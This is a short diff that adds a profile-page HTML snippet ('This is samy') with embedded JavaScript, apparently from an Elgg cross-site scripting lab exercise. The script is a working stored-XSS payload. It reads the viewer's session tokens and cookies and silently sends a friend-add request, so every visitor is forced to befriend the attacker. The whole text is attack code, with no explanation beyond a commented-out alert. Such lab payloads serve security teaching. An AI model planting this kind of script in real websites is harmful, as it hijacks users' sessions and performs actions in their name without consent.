@@ -1,0 +1,15 @@
+<p>This is samy</p>
+<script type="text/javascript">// <![CDATA[
+  var Ajax =null;
+  var sendurl = "/action/friends/add?friend="+elgg.page_owner.guid + "&__elgg_ts=" + elgg.security.token.__elgg_ts + "&__elgg_token="+elgg.security.token.__elgg_token;
+  //alert(sendurl);
+  Ajax = new XMLHttpRequest();
+  Ajax.open("GET",sendurl, true);
+  Ajax.setRequestHeader("Host","www.xsslabelgg.com");
+  Ajax.setRequestHeader("Keep-Alive","300");
+  Ajax.setRequestHeader("connection","keep-alive");
+  Ajax.setRequestHeader("Cookie", document.cookie);
+  Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+  Ajax.send();
+
+// ]]></script>
